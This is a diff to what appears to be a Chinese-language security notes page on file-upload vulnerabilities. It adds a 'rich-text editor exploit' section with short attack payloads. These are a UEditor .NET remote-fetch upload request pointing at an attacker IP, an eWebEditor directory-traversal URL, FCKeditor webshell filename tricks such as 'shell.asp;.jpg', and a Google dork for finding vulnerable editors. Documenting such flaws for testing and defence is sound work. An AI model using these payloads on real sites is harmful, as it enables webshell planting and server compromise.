@@ -414,19 +414,33 @@ AddHandler php5-script .php
 <p>上传目录禁止运行</p>
 <p>使用白名单过滤</p>
 <p>更新php版本</p>
-<h2 id="在线编辑器任意文件上传">在线编辑器任意文件上传</h2>
-<p>UEditor</p>
-<p>eWebEditor</p>
+<h2 id="富文本编辑器-exploit">富文本编辑器 Exploit</h2>
+<p><a href="https://nosec.org/home/detail/1758.html">UEditor编辑器任意文件上传 </a>1.4.3.3和1.5.0版本中.NET版本</p>
+<pre><code>POST /ueditor/net/controller.ashx?action=catchimage
+
+source%5B%5D=http%3A%2F%2F&lt;ip&gt;/1.gif?.aspx
+</code></pre><p><a href="https://lcx.cc/post/1248/">eWebEditor各版本WebShell方法</a></p>
+<blockquote>
+<ol>
+<li>
+<p>后台登录修改设置，绕过后缀名限制</p>
+</li>
+<li>
+<p>目录遍历</p>
+<p><code>ewebeditor/admin_uploadfile.asp?id=14&amp;dir=..&amp;dir=../..&amp;dir=../../../..</code></p>
+</li>
+</ol>
+</blockquote>
 <p>CKEditor</p>
-<p><strong>FCK2.6.6版本上传漏洞绕过测试</strong></p>
-<p>在浏览器地址栏中的测试网址后面输入：<code>/_whatsnew.html</code> 查看版本信息。</p>
-<pre><code>editor/filemanager/browser/default/connectors/test.html
-</code></pre><p><strong>FCK2.4.2版本上传漏洞绕过测试</strong></p>
-<p>打开FCK上传点在浏览器地址栏中的测试网址后面输入：</p>
-<pre><code>editor/filemanager/browser/default/connectors/test.html
-</code></pre><p><strong>GoogleHacking</strong></p>
+<p><a href="https://blog.51cto.com/simeon/2117821">FCK2.4.2/2.6.6版本上传漏洞</a></p>
+<blockquote>
+<ol>
+<li>新建<code>.asp</code>文件夹，上传合法后缀木马到该文件夹</li>
+<li>上传<code>shell.asp;.jpg</code>木马</li>
+</ol>
+</blockquote>
+<p><strong>GoogleHacking</strong></p>
 <p>inurl:&ldquo;editor/filemanager&rdquo;</p>
-<p>intext:&ldquo;Index of&rdquo; site:&ldquo;edu.cn&rdquo;</p>
 <p>​</p>
 <p>​</p>
 <h2 id="参考文章">参考文章</h2>
@@ -485,7 +499,7 @@ AddHandler php5-script .php
       </ul>
     </li>
     <li><a href="#防御">防御</a></li>
-    <li><a href="#在线编辑器任意文件上传">在线编辑器任意文件上传</a></li>
+    <li><a href="#富文本编辑器-exploit">富文本编辑器 Exploit</a></li>
     <li><a href="#参考文章">参考文章</a></li>
   </ul>
 </nav></div>
